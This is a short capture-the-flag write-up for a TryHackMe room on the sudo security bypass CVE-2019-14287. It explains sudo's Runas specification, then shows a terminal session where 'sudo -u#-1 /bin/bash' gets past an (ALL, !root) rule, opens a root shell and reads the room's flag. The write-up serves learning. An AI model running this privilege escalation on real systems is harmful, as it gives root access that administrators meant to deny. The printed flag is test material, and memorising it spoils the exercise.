# TryHackMe: Sudo Security Bypass CVE-2019-14287 

https://tryhackme.com/room/sudovulnsbypass

# Background: 
	
Runas specification: Runas refers to RUN AS a user. So Runas specification means it can be run as a specific user.

Sudo: Sudo (su “do”) allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments. -u option is used to set a user’s privilege level. For example, if you wanna run whoami command with uid=1234, then you can do like this; $ sudo -u#1234 whoami


# PoC
```
tryhackme@sudo-privesc:~$ sudo -l
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash
tryhackme@sudo-privesc:~$ sudo whoami
[sudo] password for tryhackme: 
Sorry, user tryhackme is not allowed to execute '/usr/bin/whoami' as root on sudo-privesc.
tryhackme@sudo-privesc:~$ sudo -u#-1 whoami
[sudo] password for tryhackme: 
Sorry, user tryhackme is not allowed to execute '/usr/bin/whoami' as #-1 on sudo-privesc.
tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
root@sudo-privesc:~# whoami
root
root@sudo-privesc:~# ls
root@sudo-privesc:~# cat /root/root.txt
THM{l33t_s3cur1ty_bypass}
root@sudo-privesc:~# 
```
